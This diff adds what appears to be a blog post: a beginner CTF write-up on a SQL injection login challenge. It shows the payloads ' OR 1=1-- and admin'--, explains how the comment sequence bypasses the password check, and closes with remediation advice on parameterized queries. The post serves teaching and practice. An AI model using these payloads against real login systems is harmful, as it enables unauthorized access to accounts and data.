@@ -1,0 +1,60 @@
+---
+title: "Example CTF Writeup - SQL Injection"
+description: "Writeup for a beginner-friendly SQL injection challenge from a recent CTF competition."
+date: 2026-08-15
+tags: ["Web", "SQL Injection", "Beginner"]
+image: "/img/Projects/Coffe.png"
+---
+
+## Challenge Overview
+
+We're given a login page at `http://challenge.example.com/login`. The goal is to access the admin panel and retrieve the flag.
+
+## Reconnaissance
+
+First, let's test the login form with some basic input.
+
+Entering `' OR 1=1--` in the username field:
+
+```sql
+' OR 1=1--
+```
+
+The application returns a SQL error, which confirms that the input is being directly concatenated into the query.
+
+## Exploitation
+
+The vulnerable query looks something like:
+
+```sql
+SELECT * FROM users WHERE username = '$username' AND password = '$password'
+```
+
+By injecting:
+
+```
+Username: admin'--
+Password: anything
+```
+
+The query becomes:
+
+```sql
+SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
+```
+
+The `--` comments out the rest of the query, bypassing the password check.
+
+## Flag
+
+After logging in as admin, we find the flag on the dashboard:
+
+```
+CTF{sql_1nj3ct10n_1s_st1ll_d4ng3r0us}
+```
+
+## Remediation
+
+- Use parameterized queries / prepared statements
+- Never concatenate user input directly into SQL queries
+- Implement input validation and sanitization
